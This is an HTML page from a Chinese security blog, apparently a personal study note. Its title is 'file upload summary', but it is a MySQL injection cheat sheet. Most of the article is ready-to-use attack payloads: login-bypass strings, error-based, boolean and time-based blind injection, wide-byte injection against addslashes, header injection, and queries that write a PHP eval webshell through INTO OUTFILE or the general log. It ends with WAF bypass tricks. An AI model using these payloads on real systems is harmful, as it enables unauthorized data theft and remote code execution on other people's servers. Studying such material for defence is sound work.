@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>文件上传总结 | h00ls</title>
+    <meta name="description" content="Mysql安全Mysql注入万能密码1234567&#39; or 1&#39;&#39; or 1 -- -&quot; or &quot;&quot; &#x3D; &quot;&quot; or 1&#x3D;1 -- -&#39; &#x3D; &#39;&#39;LIKE&#39;&#39;&#x3D;0 -- + 判断注入点要闭合语句，让sql语句正常才能执行 12345678&amp;#39">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传总结">
+<meta property="og:url" content="http://example.com/2021/03/23/Mysql%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="h00ls">
+<meta property="og:description" content="Mysql安全Mysql注入万能密码1234567&#39; or 1&#39;&#39; or 1 -- -&quot; or &quot;&quot; &#x3D; &quot;&quot; or 1&#x3D;1 -- -&#39; &#x3D; &#39;&#39;LIKE&#39;&#39;&#x3D;0 -- + 判断注入点要闭合语句，让sql语句正常才能执行 12345678&amp;#39">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210118100808835.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210118100736325.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210118100530058.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210123110631247.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210123102918005.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319203004955.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319183842847.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319191013437.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319191120045.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319182938912.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319202515804.png">
+<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319183435268.png">
+<meta property="article:published_time" content="2021-03-23T12:37:08.000Z">
+<meta property="article:modified_time" content="2021-03-23T12:39:04.006Z">
+<meta property="article:author" content="h00ls">
+<meta property="article:tag" content="Mysql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210118100808835.png">
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+    <link rel="icon" href="/images/favicon.png" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/h00ls" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="https://www.gravatar.com/avatar/0bc83cb571cd1c50ba6f3e8a78ef1346?s=128" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">h00ls</h2>
+            <h3 id="title" class="hidden xl:block">安全那些事</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                Sichuan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/h00ls">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-12 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            文件上传总结
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2021/03/23/Mysql%E5%AE%89%E5%85%A8/" class="article-date">
+	  <time datetime="2021-03-23T12:37:08.000Z" itemprop="datePublished">Mar 23</time>
+	</a>
+</span>
+                
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/Mysql/" rel="tag">Mysql</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2021/03/23/Mysql%E5%AE%89%E5%85%A8/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+
+
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 1.8k(words)</span>
+    
+	
+	
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 7(minutes)</span>
+    
+	
+	
+    
+		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+		<span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span></span>
+		<span class="post-meta-divider"> | </span>
+		<span id="busuanzi_container_site_uv">UV: <span id="busuanzi_value_site_uv"></span></span>
+
+    
+	
+	
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h1 id="Mysql安全"><a href="#Mysql安全" class="headerlink" title="Mysql安全"></a>Mysql安全</h1><h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#39;</span><br><span class="line">&#39; or 1 -- -</span><br><span class="line">&quot; or &quot;&quot; &#x3D; &quot;</span><br><span class="line">&quot; or 1&#x3D;1 -- -</span><br><span class="line">&#39; &#x3D; &#39;</span><br><span class="line">&#39;LIKE&#39;</span><br><span class="line">&#39;&#x3D;0 -- +</span><br></pre></td></tr></table></figure>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>要闭合语句，让<code>sql</code>语句正常才能执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">)</span><br><span class="line">))</span><br><span class="line">&#39;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;)</span><br><span class="line">&quot;))</span><br></pre></td></tr></table></figure>
+<h3 id="常用内置函数"><a href="#常用内置函数" class="headerlink" title="常用内置函数"></a>常用内置函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">version()        当前数据库详细版本号</span><br><span class="line">database()       当前所在的数据库</span><br><span class="line">user()            当前数据库用户权限</span><br><span class="line">@@datadir         数据文件的存放目录</span><br><span class="line">@@basedir          数据库的安装路径</span><br><span class="line">@@version_compile_os        宿主系统平台是什么</span><br><span class="line">@@hostname                  当前机器的机器名</span><br><span class="line">show variables like &#39;log_%      查看日志文件存放位置</span><br></pre></td></tr></table></figure>
+<h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>页面显示不正常，会在页面出现</p>
+<h4 id="基于错误注入"><a href="#基于错误注入" class="headerlink" title="基于错误注入"></a>基于错误注入</h4><p>会报错sql语句错误信息</p>
+<p><strong>updatexml</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(&#39;~&#39;,version(),&#39;~&#39;),1)-- -</span><br></pre></td></tr></table></figure>
+<p><strong>extractvalue</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+<p>参数Xpath需要的是 xpath格式的字符串，不是就会报错，sql语句由内向外执行报错得到查询的信息</p>
+<p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，所以MySQL 5.1.5版本以下的不能上述函数进行报错注入。并且，上述报错注入函数有字符限制，最长32位</p>
+<p><strong>exp</strong></p>
+<p><code>MySql5.5.5</code>版本后整形溢出才会报错</p>
+<p><strong>几何函数报错注入</strong></p>
+<p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</p>
+<h4 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h4><p>不会给出具体错误信息。sql语句正常是返回正常，异常时返回自定义的错误信息</p>
+<p>正确情况</p>
+<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210118100808835.png" alt="image-20210118100808835"></p>
+<p>错误情况</p>
+<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210118100736325.png" alt="image-20210118100736325"></p>
+<p>布尔型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and substr(version(),1,1)&#x3D;5-- -</span><br></pre></td></tr></table></figure>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>不管输入的正确与否都会会显出正确的页面，也就是只会有相应时间的差别。</p>
+<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210118100530058.png" alt="image-20210118100530058"></p>
+<p>时间延迟注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and if(substr(user(),2,1)&#x3D;&#39;o&#39;, sleep(1),sleep(5))-- -</span><br></pre></td></tr></table></figure>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h5 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h5><p>Mysql在使用GBK编码的时候，会认为两个字节为一个汉字（当前一个ascii码大于128的时候，就是汉字了），而输入<code>%df%27</code>经过注释符就变成<code>%df%5c%27</code>，第一个字节大于128，所以<code>%df%5c</code>组合成一个汉字，就留下了<code>%27</code>，单引号就已经被带入数据库进行闭合了。把这个思路扩展到世界上所有多字节编码，只要低位的范围中含有<code>0x5c</code>的编码，就可以进行宽字符注入。</p>
+<h5 id="宽字节注入实践"><a href="#宽字节注入实践" class="headerlink" title="宽字节注入实践"></a>宽字节注入实践</h5><p>TIPS：sqlmap无法直接注入，需要使用tamper <code>unmagicquotes.py</code>。或者在id后加上<code>%df&#39;</code> ，单引号需要根据情况修改闭合</p>
+<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210123110631247.png" alt="image-20210123110631247"></p>
+<p>GET</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 %df 吃掉后面的 \   &#x3D;&#x3D;&#x3D;&gt;  payload: id&#x3D;1%df&#39; -- -</span><br></pre></td></tr></table></figure>
+<p>POST</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 %df 先进行urldecode  ß  然后利用</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210123102918005.png" alt="image-20210123102918005"></p>
+<h5 id="宽字节注入防范"><a href="#宽字节注入防范" class="headerlink" title="宽字节注入防范"></a>宽字节注入防范</h5><p>在查询语句前使用<code>mysql_query(SET character_set_client=binary)</code></p>
+<h4 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h4><p>报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;updatexml(1,concat(&#39;~&#39;,version()),1)</span><br></pre></td></tr></table></figure>
+<p>延时注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1,(select 1 from (select sleep(3))a)</span><br></pre></td></tr></table></figure>
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用;结束前面的sql语句，然后执行自己的新语句。</span><br></pre></td></tr></table></figure>
+<h3 id="常见闭合"><a href="#常见闭合" class="headerlink" title="常见闭合"></a>常见闭合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">)</span><br><span class="line">&#39;)</span><br><span class="line">&quot;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;))</span><br></pre></td></tr></table></figure>
+<h3 id="消息头注入"><a href="#消息头注入" class="headerlink" title="消息头注入"></a>消息头注入</h3><p><code>Referer</code> 和 <code>User-Agent</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;XOR(if(now()&#x3D;sysdate(),sleep(6*6-30),0))OR&#39;</span><br><span class="line"></span><br><span class="line">&#39;+(select*from(select(sleep(20)))a)+&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="PHP特殊函数"><a href="#PHP特殊函数" class="headerlink" title="PHP特殊函数"></a>PHP特殊函数</h2><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>在PHP4.0及以上的版本中，默认是开启的，本特性已自PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除，在PHP 5.4.O 起将始终返回 FALSE。</p>
+<p>这个函数，只有在页面传递 <code>$_GET,$_POST,$_COOKIE</code> 时才会发生作用，如果输入的数据有单引号<code>&#39;</code>、<code>双引号&quot;</code>、<code>反斜线（/）</code>与 <code>NUL（NULL 字符）</code>等字符都会自动加上<code>反斜线</code>。</p>
+<p><strong>绕过：</strong>针对数字型注入的不会使用单引号，因此可以绕过<code>addslashes()</code>函数。针对数字型注入，还需要<code>intval()</code>函数加强防御。</p>
+<h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h4><p>转义sql语句中使用的字符串中的特殊字符：<code>\x00、\n、\r、\、&#39;、&quot;、\x1a</code></p>
+<p><strong>但是，宽字节注入可以绕过</strong></p>
+<h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><p>返回在预定义字符之前添加反斜杠的字符串，预定义字符：’、”、\、NULL</p>
+<p><strong>但是，宽字节注入可以绕过</strong></p>
+<h2 id="Mysql写文件"><a href="#Mysql写文件" class="headerlink" title="Mysql写文件"></a>Mysql写文件</h2><p><strong>条件</strong></p>
+<p>1、知道绝对路径</p>
+<p>2、需要 <code>dba</code> 权限</p>
+<p>3、目标文件夹有<code>写</code>的权限，一般选择<code>upload</code>、<code>images</code>等目录</p>
+<p>4、未开启<code>GPC</code>。php5.2.29之后就没有<code>magic_quotes_gpc</code></p>
+<p>5、必须要 <code>secure_file_priv</code>不为<code>NULL</code>，在<code>my.ini</code>中设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">所有目录都可写</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;</span><br><span class="line"></span><br><span class="line">只能写入指定目录</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;&quot;F:\\phpstudy_pro\\WWW\\sqli\\rain.php&quot;</span><br><span class="line"></span><br><span class="line">所有都不可写</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;NULL</span><br></pre></td></tr></table></figure>
+<p>查询<code>secure_file_priv:</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%secure_file_priv%&quot;;</span><br></pre></td></tr></table></figure>
+<h5 id="利用union-select-写入"><a href="#利用union-select-写入" class="headerlink" title="利用union select 写入"></a>利用union select 写入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接写入文件</span><br><span class="line">id&#x3D;-1&#39; union select 1,&quot;&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;&quot;,3 into outfile &#39;E:\\eval.php&#39;-- -</span><br><span class="line"></span><br><span class="line"># 使用hex编码一句话绕过</span><br><span class="line">id&#x3D;-1&#39; union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile  &#39;E:\\eval.php&#39;-- -</span><br></pre></td></tr></table></figure>
+<h5 id="terminated写入webshell"><a href="#terminated写入webshell" class="headerlink" title="terminated写入webshell"></a>terminated写入webshell</h5><p>我没尝试成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\2.php&#39; COLUMNS terminated by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\numm2.php&#39; fields terminated by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\numm.php&#39; lines starting by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\num.php&#39; lines terminated by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure>
+<h5 id="利用log写入"><a href="#利用log写入" class="headerlink" title="利用log写入"></a>利用log写入</h5><p>具体权限要求：数据库用户需具备<code>Super</code>和<code>File</code>服务器权限、获取物理路径。</p>
+<p>查看配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%general%&quot;;</span><br></pre></td></tr></table></figure>
+<p>开启日志功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br></pre></td></tr></table></figure>
+<p>指定日志目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;F:\\Program_File\\phpstudy_pro\\WWW\\123.php&#39;</span><br></pre></td></tr></table></figure>
+<p>写入webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>空格</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SQLite3</td>
+<td>0A, 0D, 0C, 09, 20</td>
+</tr>
+<tr>
+<td>Mysql 5</td>
+<td>09, 0A, 0B, 0D, 0C, A0, 20</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>00, 09, 0A, 0B, 0C, 0D, 20</td>
+</tr>
+<tr>
+<td>MSSQL 2008</td>
+<td>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20,25</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在php中\s会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20</span><br><span class="line">但是在mysql中空白字符为  0x09,0x0a,0x0b,0x0c,0x0d,0x20,0xa0 </span><br><span class="line"></span><br><span class="line">&#x2F;**&#x2F;  注释符号</span><br><span class="line"></span><br><span class="line">科学计数法(1e0)，数字计算(+、-、*、&#x2F;）、特殊字符（\N)，注释符(&#x2F;**&#x2F;)</span><br></pre></td></tr></table></figure>
+<p><strong>无空格查询</strong></p>
+<p>index.php?id=1e0and{``select(left(database(),1))=’a’}</p>
+<h5 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">重写绕过</span><br><span class="line">aandnd		</span><br><span class="line">oorr   </span><br><span class="line"></span><br><span class="line">使用特殊符号绕过</span><br><span class="line">%26%26    GET 请求</span><br><span class="line">&amp;&amp;        POST 请求</span><br><span class="line">||</span><br><span class="line">注释符 + %0a  绕过</span><br><span class="line"></span><br><span class="line">注释符绕过</span><br><span class="line">an&#x2F;**&#x2F;d    添加注释符</span><br><span class="line">an&#x2F;*!*&#x2F;d    内联注释</span><br></pre></td></tr></table></figure>
+<h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"></span><br><span class="line">-- -</span><br><span class="line"></span><br><span class="line">&#x2F;**&#x2F;    # 在其中添加一些垃圾数据，如：1&#39; union&#x2F;%%!asd%%%%&#x2F;select database(&#x2F;%%!fwji%%%%&#x2F;)</span><br><span class="line"></span><br><span class="line">;%00</span><br><span class="line"></span><br><span class="line">&#96;  # 只能用于在作为别名使用时结束查询</span><br></pre></td></tr></table></figure>
+<h5 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1&amp;id&#x3D;1&#39; select version()</span><br></pre></td></tr></table></figure>
+<p>还可以写成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;select 1&amp;id&#x3D;2,version() from dbname</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="多个POST请求包绕过"><a href="#多个POST请求包绕过" class="headerlink" title="多个POST请求包绕过"></a>多个POST请求包绕过</h5><h5 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a><strong>分块传输</strong></h5><p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319203004955.png" alt="image-20210319203004955"></p>
+<h5 id="Burpsuite中的Change-body-encoding"><a href="#Burpsuite中的Change-body-encoding" class="headerlink" title="Burpsuite中的Change body encoding"></a><strong>Burpsuite中的Change body encoding</strong></h5><p>任意修改其中的boundary，但是下面的boundary必须有两个<code>--</code>结尾</p>
+<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319183842847.png" alt="image-20210319183842847"></p>
+<p>还可以添加<code>filename</code>，但是需要注释才可以。</p>
+<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319191013437.png" alt="image-20210319191013437"></p>
+<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319191120045.png" alt="image-20210319191120045"></p>
